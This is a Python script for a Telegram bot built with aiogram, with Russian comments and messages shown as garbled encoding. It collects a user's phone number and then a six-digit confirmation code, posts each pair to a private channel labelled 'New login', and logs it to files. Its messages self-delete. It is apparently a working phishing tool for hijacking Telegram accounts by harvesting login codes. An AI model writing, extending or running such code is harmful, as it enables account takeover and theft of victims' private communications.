#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup

# === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è ===
# TOKEN —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Å–µ–∫—Ä–µ—Ç–µ —Å –∏–º–µ–Ω–µ–º PLAY
TOKEN = os.getenv("PLAY", "").strip()
# ID –∫–∞–Ω–∞–ª–∞ —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Å–µ–∫—Ä–µ—Ç–µ —Å –∏–º–µ–Ω–µ–º CHANNEL
CHANNEL = os.getenv("CHANNEL", "").strip()
# ADMIN ID —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ ADMIN_ID
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()

if not TOKEN:
    raise RuntimeError("Missing env var PLAY (bot token).")
if not CHANNEL:
    raise RuntimeError("Missing env var CHANNEL (channel id).")
if not ADMIN_ID:
    raise RuntimeError("Missing env var ADMIN_ID (admin user id).")

try:
    CHANNEL_ID = int(CHANNEL)
    ADMIN_ID = int(ADMIN_ID)
except ValueError:
    raise RuntimeError("CHANNEL and ADMIN_ID must be integer values (CHANNEL usually starts with -100).")

# === –§–∞–π–ª—ã –ª–æ–≥–æ–≤ ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

# —Å–æ–∑–¥–∞—ë–º CSV —Å –∑–∞–≥–æ–ª–æ–≤–∫–æ–º, –µ—Å–ª–∏ –µ—â—ë –Ω–µ—Ç
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "user_id", "username", "phone", "code"])

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ ===
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# === FSM —Å–æ—Å—Ç–æ—è–Ω–∏—è ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# –ø–∞–º—è—Ç—å –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –ø–æ–≤—Ç–æ—Ä–Ω—ã—Ö –æ—Ç–ø—Ä–∞–≤–æ–∫ (24 —á–∞—Å–∞)
user_last_submit = {}

# === –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ —É–¥–∞–ª–∏—Ç—å —á–µ—Ä–µ–∑ delay —Å–µ–∫—É–Ω–¥ ===
async def send_and_delete(chat_id: int, text: str, previous_msg: Message = None, reply_markup=None, delay: int = 10):
    if previous_msg:
        try:
            await bot.delete_message(chat_id, previous_msg.message_id)
        except Exception:
            pass
    msg = await bot.send_message(chat_id, text, reply_markup=reply_markup)
    await asyncio.sleep(delay)
    try:
        await bot.delete_message(chat_id, msg.message_id)
    except Exception:
        pass
    return msg

# === –ö–æ–º–∞–Ω–¥–∞ /start ===
@dp.message_handler(commands=["start"])
async def cmd_start(message: Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä", request_contact=True))
    await send_and_delete(message.chat.id, "–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä:", message, reply_markup=kb)
    await AuthFlow.waiting_for_phone.set()

# === –ü—Ä–∏—ë–º –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞) ===
@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthFlow.waiting_for_phone)
async def handle_contact(message: Message, state: FSMContext):
    if not message.contact or not message.contact.phone_number:
        await send_and_delete(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.", message)
        return
    phone = message.contact.phone_number
    await state.update_data(phone=phone)
    await send_and_delete(message.chat.id, "–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (–¥–æ 6 —Ü–∏—Ñ—Ä):", message)
    await AuthFlow.waiting_for_code.set()

# === –ü—Ä–∏—ë–º –∫–æ–¥–∞ ===
@dp.message_handler(state=AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext):
    uid = message.from_user.id
    now = datetime.now()

    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await send_and_delete(message.chat.id, "‚è≥ –¢—ã —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª –¥–∞–Ω–Ω—ã–µ —Å–µ–≥–æ–¥–Ω—è. –ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ.", message)
        await state.finish()
        return

    text = (message.text or "").strip()
    if not text.isdigit() or len(text) > 6:
        await send_and_delete(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–¥–∞. –í–≤–µ–¥–∏ —á–∏—Å–ª–æ–≤–æ–π –∫–æ–¥ –¥–æ 6 —Å–∏–º–≤–æ–ª–æ–≤.", message)
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    code = text
    username = message.from_user.username or ""
    timestamp = now.isoformat()

    channel_text = (
        f"üì≤ –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n"
        f"–ù–æ–º–µ—Ä: {phone}\n"
        f"–ö–æ–¥: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username}\n"
        f"–í—Ä–µ–º—è: {timestamp}"
    )

    try:
        await bot.send_message(CHANNEL_ID, channel_text)
    except Exception as e:
        logging.exception("Failed to send to channel: %s", e)

    logging.info(f"–ù–æ–º–µ—Ä:{phone} | –ö–æ–¥:{code} | UserID:{uid} | Username:@{username}")

    try:
        with open(CSV_FILE, mode="a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, uid, username, phone, code])
    except Exception:
        logging.exception("Failed to write CSV")

    user_last_submit[uid] = now

    await send_and_delete(message.chat.id, "‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.", message)
    await state.finish()

# === –ö–æ–º–∞–Ω–¥–∞ /stats –¥–ª—è –∞–¥–º–∏–Ω–∞ ===
@dp.message_handler(commands=["stats"])
async def cmd_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    count = len(user_last_submit)
    await send_and_delete(message.chat.id, f"üìà –°–µ–≥–æ–¥–Ω—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ª–æ–≥–∏–Ω–æ–≤: {count}", message)

# === –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—à–∏–±–æ–∫ ===
@dp.errors_handler()
async def global_error_handler(update, exception):
    logging.exception("Unhandled exception: %s", exception)
    return True

# === –ó–∞–ø—É—Å–∫ ===
if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp)
